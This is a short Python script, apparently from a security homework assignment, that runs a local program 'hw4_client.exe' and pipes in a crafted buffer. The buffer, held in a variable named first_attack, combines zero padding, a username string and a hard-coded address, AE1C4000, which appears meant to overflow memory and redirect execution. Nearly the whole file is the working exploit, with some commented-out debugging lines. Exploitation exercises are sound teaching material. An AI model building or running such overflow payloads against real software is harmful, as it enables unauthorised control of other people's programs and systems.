import socket
import sys
import subprocess
from subprocess import PIPE
from time import sleep

proc = subprocess.Popen(["hw4_client.exe"], stdin=PIPE)
desiredCode = "USER"
desiredUSERNAME = "USER\n"
desiredCodeHex = str.encode(desiredUSERNAME)
proc.stdin.write(desiredCodeHex)
preMenu =  "00" * 28
postMenu = "00" * 35
#breakpoint()  # drop into the debugger at this point
first_attack = bytearray.fromhex("00000000") + bytearray.fromhex(preMenu) + str.encode(desiredCode) + bytearray.fromhex("00") + bytearray.fromhex(postMenu) + bytearray.fromhex("AE1C4000") +str.encode("\n")

proc.stdin.write(first_attack)
proc.wait(input())
#answer= 
#proc.stdin.write(str.encode(answer))
#sleep(60)
#print("end")
#proc.stdin.flush()
#proc.write(input=first_attack)

